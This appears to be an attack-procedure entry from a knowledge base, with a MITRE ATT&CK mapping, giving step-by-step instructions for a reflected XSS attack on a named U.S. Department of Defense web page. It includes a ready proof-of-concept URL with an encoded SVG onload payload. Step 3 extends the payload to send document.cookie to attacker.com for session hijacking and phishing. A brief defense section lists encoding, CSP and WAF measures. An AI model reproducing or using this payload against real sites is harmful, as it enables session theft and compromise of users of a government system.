---
id: 123e4567-e89b-12d3-a456-426614174001
name: Trigger-Reflected-XSS-with-SVG-Payload
tags:
  - xss
  - reflected-xss
  - svg-payload
  - javascript
type: procedure
tools:
  - '[[tools/Firefox]]'
  - '[[tools/Google-Chrome]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:25.103Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174001
name: Trigger-Reflected-XSS-with-SVG-Payload
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Initial Access]], [[Execution]], [[Collection]]
techniques: [[Exploit Public-Facing Application]], [[JavaScript]]
sub_techniques: []
tags: xss, reflected-xss, svg-payload, javascript
platforms: Web
commands: []
tools: [[tools/Firefox]], [[tools/Google-Chrome]]
---

# Trigger-Reflected-XSS-with-SVG-Payload

## Summary

This procedure exploits a reflected cross-site scripting (XSS) vulnerability in the 'i=' parameter of the ViewContent.aspx endpoint on a U.S. Department of Defense website by injecting a URL-encoded SVG payload that executes arbitrary JavaScript upon page load, allowing attackers to steal session data or perform actions in the victim's browser.

## Description

The vulnerability arises because URL-encoded values in the 'i=' parameter are not properly escaped, enabling injection of HTML/JavaScript. Attackers craft a malicious URL that, when visited by a victim (e.g., via phishing), reflects the payload into the page. The SVG onload handler executes JavaScript like confirm(1) for testing, but in practice, it can exfiltrate cookies (e.g., document.cookie) or redirect to phishing sites. This targets ASP.NET web applications and requires no authentication, making it suitable for drive-by attacks on public-facing sites.

## Requirements

1. Access to a web browser like Firefox or Google Chrome for testing
2. The target URL: https://www.████/ViewContent.aspx?con_id_pk=2726&fr=s
3. Victim interaction: The target user must visit the maliciously crafted URL
4. No special privileges; works on any modern browser

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding for URL parameters (e.g., using HtmlEncode in ASP.NET)
- Deploy Content Security Policy (CSP) to block inline scripts and SVG onload events
- Monitor web server logs for suspicious URL patterns containing encoded payloads like %3Csvg%2fonload
- Use Web Application Firewalls (WAF) to detect and block XSS payloads

## Objectives

1. Inject and execute JavaScript in the victim's browser context
2. Demonstrate vulnerability with a harmless alert; extend to steal session cookies or perform unauthorized actions
3. Enable phishing or session hijacking on the DoD website

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Build the URL by appending the vulnerable 'i=' parameter with a URL-encoded payload that closes any existing context and injects an SVG element triggering JavaScript on load.

The payload decodes to: l9716'();}]9836&001</Script><Svg/OnLoad=(confirm)(1)>=1

This injects <svg/onload=(confirm)(1)> to execute the confirm dialog.

Full POC URL:

https://www.████/ViewContent.aspx?con_id_pk=2726&fr=s&i=l9716%27();%7D%5D9836&001%3C%2FScript%2F%3E%3CSvg%2FOnLoad%3D(confirm)(1)%3E=1

### Step 2: Visit the URL in a Browser

**Context**: Use Firefox or Google Chrome to access the crafted URL, simulating a victim visit. The reflected payload executes immediately upon page load.

Open the browser and navigate to the POC URL. No additional commands are needed; the vulnerability triggers passively.

**Expected Output**: The page loads with the injected SVG, triggering a confirm dialog displaying "1". Check the browser's developer console for JavaScript execution logs.

### Step 3: Verify and Extend the Payload

**Context**: Confirm the XSS works, then modify the payload for real attacks, such as sending document.cookie to an attacker-controlled server.

Replace (confirm)(1) with fetch('https://attacker.com/steal?cookie=' + document.cookie). For validation, inspect the page source to see the reflected, unescaped payload.

**Expected Output**: Successful execution without errors; payload visible in HTML source.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- [[tools/Firefox]]
- [[tools/Google-Chrome]]

## Tags

- [[xss]]
- [[reflected-xss]]
- [[svg-payload]]
- [[JavaScript]]
